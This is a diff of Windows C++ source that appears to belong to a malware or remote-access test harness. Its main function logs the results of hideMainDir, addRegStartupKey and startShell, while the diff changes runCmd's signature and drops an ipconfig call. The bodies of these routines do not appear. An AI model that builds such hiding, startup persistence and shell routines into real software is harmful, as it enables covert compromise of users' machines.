@@ -11,7 +11,7 @@ const char* bool2str(bool b) {
 	return (b ? "SUCCESS" : "FAILED");
 }
 
-std::string runCmd(std::string cmd) {
+std::string runCmd() {
 	
 	// setup handles
 	HANDLE g_hChildStd_OUT_Rd = NULL;
@@ -195,7 +195,7 @@ bool startShell() {
 }
 
 
-int main(int argc, char* argv[]) {
+int main() {
 	
 	std::ofstream f("output.txt", std::ofstream::app);
 	f << "==============================="                         << std::endl;
@@ -206,7 +206,7 @@ int main(int argc, char* argv[]) {
 	f << "hideMainDir()      ... " << bool2str(hideMainDir()     ) << std::endl;
 	f << "addRegStartupKey() ... " << bool2str(addRegStartupKey()) << std::endl;
 	f << "startShell()       ... " << bool2str(startShell()      ) << std::endl;
-	f << runCmd("ipconfig.exe");
+	f << runCmd();
 	f << "==============================="                         << std::endl;
 	return 0;
 }
